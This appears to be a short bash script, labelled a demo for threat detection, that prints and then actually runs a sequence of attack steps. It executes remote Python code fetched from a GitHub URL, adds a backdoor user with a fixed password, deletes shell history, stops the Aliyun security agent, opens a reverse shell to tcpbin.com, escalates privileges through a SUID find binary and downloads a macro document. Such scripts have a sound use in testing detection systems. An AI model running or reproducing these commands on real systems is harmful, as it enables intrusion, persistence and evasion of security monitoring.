#########################################################################
# File Name: test.sh
#########################################################################
#!/bin/bash
# Demo for threat detection
date 
echo "python -c \"exec(__import__(\'urllib\').urlopen(\'https://raw.githubusercontent.com/mangosteen/demo/master/pyexe\').read())\""
python -c "exec(__import__('urllib').urlopen('https://raw.githubusercontent.com/mangosteen/demo/master/pyexe').read())"
sleep 5
date
echo "deluser ggiitt;useradd ggiitt;usermod --password $(echo 123QWEASD123 | openssl passwd -1 -stdin) ggiitt;"
deluser ggiitt;useradd ggiitt;usermod --password $(echo 123QWEASD123 | openssl passwd -1 -stdin) ggiitt;
sleep 5
date
echo "rm ~/.bash_history"
rm ~/.bash_history
sleep 5
date
echo "systemctl stop aliyun.service"
systemctl stop aliyun.service
sleep 5
date
echo "bash -i >& /dev/tcp/tcpbin.com/4242 0>&1"
bash -i >& /dev/tcp/tcpbin.com/4242 0>&1 &
sleep 5
date
echo "chmod +s `which find`;echo 'id;sleep 5;exit'|su - ggiitt -c 'find / -exec bash -p \\; -quit';chmod -s `which find`"
chmod +s `which find`;echo 'id;sleep 5;exit'|su - ggiitt -c 'find / -exec bash -p \; -quit';chmod -s `which find`
sleep 5
date
echo "wget https://raw.githubusercontent.com/mangosteen/demo/master/v.docm -O /tmp/v.docm"
wget https://raw.githubusercontent.com/mangosteen/demo/master/v.docm -O /tmp/v.docm
sleep 5

